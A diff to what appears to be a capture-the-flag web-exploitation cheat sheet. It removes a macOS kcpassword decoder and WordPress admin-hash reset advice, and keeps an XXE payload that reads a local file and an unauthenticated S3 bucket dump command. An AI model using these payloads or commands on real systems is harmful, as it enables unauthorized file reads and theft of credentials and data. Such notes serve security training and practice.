@@ -18,45 +18,22 @@ print scraper.get(url).content
 
 	* A Ruby script to scan and do reconnaissance on a [Wordpress](https://en.wikipedia.org/wiki/WordPress) application.
 
-* Mac AutoLogin Password Cracking
 
-Sometimes, given an Mac autologin password file `/etc/kcpassword`, you can crack it with this code:
-
-```
-def kcpasswd(ciphertext):
-    key = '7d895223d2bcddeaa3b91f'
-    while len(key) < (len(ciphertext)*2):
-        key = key + key
-    key = binasciiunhexlify(key)
-    result = ''
-    for i in range(len(ciphertext)):
-        result += chr(ord(ciphertext[i]) ^ (key[i]))
-    return result
-```
 * XXE : XML External Entity
 
-An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
-We try to display the content of the file /flag :
+    Include local files in XML. Can be used to make an **LFI** from a XML parser.
+    XML script to display the content of the file /flag :
 
-```
+    Dont forget to use <?xml version="1.0" encoding="UTF-16"?> on Windows (for utf16).
+
+``` xml
 <?xml version="1.0"?>
 <!DOCTYPE data [
 <!ELEMENT data (#ANY)>
 <!ENTITY file SYSTEM "file:///flag">
 ]>
 <data>&file;</data>
-
-<?xml version="1.0" encoding="UTF-16"?>
-  <!DOCTYPE foo [
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>
-
-  ```
-* Wordpress Password Hash Generator
-
-	If you make it into a Wordpress database and can change passwords, reset the admin password to a new hash: [http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4](http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4). This will let you login to /wp-admin/ on the site.
-
-
+```
 
 
 * Flask Template Injection
@@ -69,21 +46,18 @@ We try to display the content of the file /flag :
 
 * [`nikto`](https://github.com/sullo/nikto)
 
-	A Perl script to scan and do reconnaissance on a web application.
+	Website scanner implemented in [Perl](https://en.wikipedia.org/wiki/Perl).
 
 
 * [Burpsuite](https://portswigger.net/burp)
 
-	A proxy server that allows you to intercept and modify HTTP requests and responses. It's a great tool for testing web applications.
+	Tool suite generally used to intercept and manipulate HTTP requests.
 
 
+* AWS / S3 Buckets dump
 
+	Dump all files from a S3 bucket without credentials.
 
-* AWS / S3 Buckets
-
-	You can try and dump an AWS bucket like so. The `--no-sign-request` avoids the need for credentials, and `--recursive` will grab everything possible.
-
-```
+``` bash
 aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
 ```
-	i. e. `aws s3 cp --recursive --no-sign-request s3://tamuctf .`
